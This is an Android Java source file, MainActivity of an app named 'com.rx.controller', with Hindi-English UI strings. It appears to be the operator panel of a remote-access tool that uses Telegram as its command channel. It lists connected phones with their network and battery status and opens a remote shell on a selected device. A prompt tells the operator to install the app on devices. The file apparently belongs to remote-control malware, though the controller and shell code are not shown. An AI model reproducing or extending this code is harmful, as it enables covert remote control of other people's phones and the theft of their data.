package com.rx.controller;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.View;
import android.widget.*;
import androidx.appcompat.app.AppCompatActivity;
import java.util.List;

public class MainActivity extends AppCompatActivity
        implements TelegramController.OnUpdateListener {

    private TelegramController controller;
    private ListView            deviceList;
    private TextView            statusText;
    private TextView            connText;
    private ProgressBar         loader;
    private DeviceAdapter       adapter;
    private final Handler       handler = new Handler(Looper.getMainLooper());

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        deviceList = findViewById(R.id.deviceList);
        statusText = findViewById(R.id.statusText);
        connText   = findViewById(R.id.connText);
        loader     = findViewById(R.id.loader);

        // Adapter
        adapter = new DeviceAdapter(this);
        deviceList.setAdapter(adapter);

        // Device click → Shell open
        deviceList.setOnItemClickListener((parent, view, pos, id) -> {
            Device d = adapter.getItem(pos);
            if (d != null && d.online && d.isAlive()) {
                openShell(d);
            } else {
                Toast.makeText(this, "❌ Device offline!", Toast.LENGTH_SHORT).show();
            }
        });

        // Refresh button
        findViewById(R.id.btnRefresh).setOnClickListener(v -> {
            statusText.setText("🔄 Refreshing...");
            loader.setVisibility(View.VISIBLE);
        });

        // Start controller
        startController();
    }

    private void startController() {
        statusText.setText("🔗 Telegram se connect ho raha hun...");
        loader.setVisibility(View.VISIBLE);
        connText.setText("⏳ Waiting for devices...");

        controller = new TelegramController();
        controller.setListener(this);
        controller.start();
    }

    private void openShell(Device device) {
        Intent intent = new Intent(this, ShellActivity.class);
        intent.putExtra("device_id", device.id);
        intent.putExtra("network",   device.network);
        intent.putExtra("battery",   device.battery);
        startActivity(intent);
    }

    // ── TelegramController Callbacks ─────────────────────────────────

    @Override
    public void onDeviceListChanged(List<Device> devices) {
        handler.post(() -> {
            adapter.setDevices(devices);
            loader.setVisibility(View.GONE);

            long online = devices.stream().filter(d -> d.online && d.isAlive()).count();
            statusText.setText("📱 " + devices.size() + " device(s)  |  🟢 " + online + " online");

            if (devices.isEmpty()) {
                connText.setText("⏳ Koi device nahi mila — app install karo...");
            } else {
                connText.setText("✅ Connected! Device select karo →");
            }
        });
    }

    @Override
    public void onOutput(String deviceId, String output) {
        // ShellActivity handle karega
    }

    @Override
    public void onConnected() {
        handler.post(() -> {
            connText.setText("✅ Telegram connected!");
            loader.setVisibility(View.GONE);
        });
    }

    @Override
    public void onError(String msg) {
        handler.post(() -> statusText.setText("❌ " + msg));
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (controller != null) controller.stop();
    }

    // Static reference for ShellActivity
    private static TelegramController instance;
    public static void setControllerInstance(TelegramController c) { instance = c; }
    public static TelegramController getController() { return instance; }

    @Override
    protected void onResume() {
        super.onResume();
        if (controller != null) setControllerInstance(controller);
    }
}
